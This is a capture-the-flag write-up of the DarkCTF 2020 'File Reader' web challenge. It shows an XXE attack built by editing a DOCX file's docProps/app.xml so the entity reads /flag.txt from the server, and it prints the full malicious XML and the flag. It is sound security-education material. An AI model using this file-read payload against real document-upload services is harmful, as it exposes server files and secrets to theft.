<h1>DarkCTF 2020 â€“ File Reader</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 494?</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>My friend developed this website but he says user should know some Xtreme &gt; Manipulative Language to understand this web.</p>
  
  <p>Flag is in /flag.txt</p>
  
  <p>http://filereader.darkarmy.xyz/</p>
</blockquote>

<h2>Solution</h2>

<p>The web site is a form to upload files. Reading the challenge description, an <em>XXE</em> should be involved.</p>

<p>The form allows only PDF and DOCX files.</p>

<p>Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.</p>

<p>DOCX files are archives of files where XML documents are present.</p>

<p>It is sufficient to create a DOCX and to alter the <a href="app.xml"><code>test.docx\docProps\app.xml</code></a> file, where the number of pages is stored, like the following.</p>

<p><code>xml
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///flag.txt" &gt;]&gt;
&lt;Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"&gt;&lt;Template&gt;Normal.dotm&lt;/Template&gt;&lt;TotalTime&gt;0&lt;/TotalTime&gt;&lt;Pages&gt;&amp;xxe;&lt;/Pages&gt;&lt;Words&gt;0&lt;/Words&gt;&lt;Characters&gt;4&lt;/Characters&gt;&lt;Application&gt;Microsoft Office Word&lt;/Application&gt;&lt;DocSecurity&gt;0&lt;/DocSecurity&gt;&lt;Lines&gt;1&lt;/Lines&gt;&lt;Paragraphs&gt;1&lt;/Paragraphs&gt;&lt;ScaleCrop&gt;false&lt;/ScaleCrop&gt;&lt;Company&gt;Reply&lt;/Company&gt;&lt;LinksUpToDate&gt;false&lt;/LinksUpToDate&gt;&lt;CharactersWithSpaces&gt;4&lt;/CharactersWithSpaces&gt;&lt;SharedDoc&gt;false&lt;/SharedDoc&gt;&lt;HyperlinksChanged&gt;false&lt;/HyperlinksChanged&gt;&lt;AppVersion&gt;16.0000&lt;/AppVersion&gt;&lt;/Properties&gt;
</code></p>

<p>Uploading the file in the web application will return the flag where the number of pages is shown. The flag will be the following.</p>

<p><code>
darkCTF{1nj3ct1ng_d0cx_f0r_xx3}
</code></p>
